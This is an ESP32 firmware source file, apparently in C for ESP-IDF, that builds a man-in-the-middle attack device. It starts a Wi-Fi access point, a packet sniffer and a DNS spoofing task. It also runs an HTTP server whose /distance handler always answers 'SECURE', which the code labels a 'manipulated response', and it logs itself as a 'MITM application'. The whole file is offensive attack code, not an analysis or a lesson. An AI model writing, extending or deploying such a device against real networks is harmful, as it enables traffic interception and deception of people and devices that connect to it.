#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include "dns_spoof.h"
#include "esp_http_server.h"
#include "sniffer.h"

#define WIFI_SSID "**********"
#define WIFI_PASS "**********"

static const char *TAG = "MAIN";

// HTTP GET handler
esp_err_t http_get_handler(httpd_req_t *req) {
    char *buf;
    size_t buf_len = httpd_req_get_url_query_len(req) + 1;

    buf = malloc(buf_len);
    if (buf) {
        httpd_req_get_url_query_str(req, buf, buf_len);
        ESP_LOGI(TAG, "Received HTTP GET query: %s", buf);
        free(buf);
    }

    const char *response = "SECURE"; // Manipulated response
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    ESP_LOGI(TAG, "Sent HTTP response: %s", response);
    return ESP_OK;
}

// HTTP server
void start_http_server() {
    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();

    httpd_uri_t uri_handler = {
        .uri = "/distance",
        .method = HTTP_GET,
        .handler = http_get_handler,
    };

    if (httpd_start(&server, &config) == ESP_OK) {
        httpd_register_uri_handler(server, &uri_handler);
        ESP_LOGI(TAG, "HTTP server started on /distance endpoint.");
    } else {
        ESP_LOGE(TAG, "Failed to start HTTP server.");
    }
}

// Wi-Fi in AP mode
void start_wifi_ap() {
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_AP);

    wifi_config_t wifi_config = {
        .ap = {
            .ssid = WIFI_SSID,
            .ssid_len = strlen(WIFI_SSID),
            .password = WIFI_PASS,
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA_WPA2_PSK,
        },
    };

    if (strlen(WIFI_PASS) == 0) {
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
    }

    esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
    esp_wifi_start();
    ESP_LOGI(TAG, "Wi-Fi AP started. SSID: %s", WIFI_SSID);
}
void app_main() { 
    // Initialiser le stockage NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    ESP_LOGI(TAG, "NVS Flash initialized.");

    // Configurer le Wi-Fi en mode AP
    ESP_LOGI(TAG, "Starting Wi-Fi Access Point...");
    start_wifi_ap(); // Appel sans vérification du retour
    ESP_LOGI(TAG, "Wi-Fi Access Point started successfully.");

    // Initialiser le sniffer pour capturer les paquets
    ESP_LOGI(TAG, "Initializing Packet Sniffer...");
    sniffer_init(); // Appel sans vérification du retour
    ESP_LOGI(TAG, "Packet Sniffer initialized successfully.");

    // Démarrer le serveur HTTP
    ESP_LOGI(TAG, "Starting HTTP Server...");
    start_http_server(); // Appel sans vérification du retour
    ESP_LOGI(TAG, "HTTP Server started successfully.");

    // Démarrer le serveur DNS spoofing
    ESP_LOGI(TAG, "Starting DNS Spoofing...");
    if (xTaskCreate(dns_server_task, "dns_server_task", 4096, NULL, 5, NULL) == pdPASS) {
        ESP_LOGI(TAG, "DNS Spoofing started successfully.");
    } else {
        ESP_LOGE(TAG, "Failed to start DNS Spoofing task.");
        return;
    }

    ESP_LOGI(TAG, "MITM application is running.");
}



